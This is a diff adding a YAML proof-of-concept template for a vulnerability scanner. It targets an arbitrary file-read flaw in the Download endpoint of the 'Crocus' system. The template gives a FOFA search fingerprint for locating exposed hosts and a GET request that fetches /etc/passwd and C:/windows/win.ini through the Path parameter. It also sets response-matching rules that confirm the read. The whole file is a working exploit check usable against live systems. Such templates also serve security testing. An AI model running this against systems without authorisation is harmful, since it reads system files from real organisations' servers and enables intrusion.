@@ -1,0 +1,19 @@
+id: poc-yaml-crocus-dzwnload-fileread
+info:
+  name: Crocus系统Download接口 文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: Crocus系统
+  fofa: body="inp_verification"
+variables:
+  r_data_linux: '/etc/passwd
+
+    C:/windows/win.ini'
+requests:
+- method: GET
+  path: /Service.do?Action=Download&Path={{.r_data_linux}}
+  expression: "status_code == 200 &&\n(\ncontains(body, \"bit app support\") && \n\
+    contains(body,\"fonts\") &&\ncontains(body,\"extensions\")\n) || (\nmatches(body,\
+    \ \"root:.*:0:0:\")\n)\n"
+transport: http
